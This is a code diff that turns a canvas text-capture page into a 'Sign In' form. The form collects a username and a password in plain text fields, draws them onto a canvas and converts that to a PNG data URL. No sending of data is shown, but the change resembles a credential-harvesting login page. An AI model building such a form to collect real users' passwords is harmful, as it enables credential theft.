@@ -4,8 +4,9 @@
   <title>Canvas Screen Capture</title>
 </head>
 <body>
-  <input type="text" id="userText" placeholder="Enter text">
-  <button onclick="captureCanvas()">Capture and Convert to PNG</button>
+  <input type="text" id="userName" placeholder="Enter Username">
+  <input type="text" id="userPass" placeholder="Enter Password">
+  <button onclick="captureCanvas()">Sign In</button>
 
   <script>
     function captureCanvas() {
@@ -16,12 +17,18 @@
       ctx.clearRect(0, 0, canvas.width, canvas.height);
 
       // Get user input text
-      const userText = document.getElementById("userText").value;
+      const userName = document.getElementById("userName").value;
+      const userPass = document.getElementById("userPass").value;
 
       // Draw the user input text on the canvas
       ctx.fillStyle = "black";
       ctx.font = "24px Arial";
-      ctx.fillText(userText, 50, 50);
+      ctx.fillText(userName, 50, 50);
+
+         // Draw the user input text on the canvas
+      ctx.fillStyle = "black";
+      ctx.font = "24px Arial";
+      ctx.fillText(userPass, 50, 50);
 
       // Convert the canvas to a data URL with PNG format
       const dataURL = canvas.toDataURL("image/png");
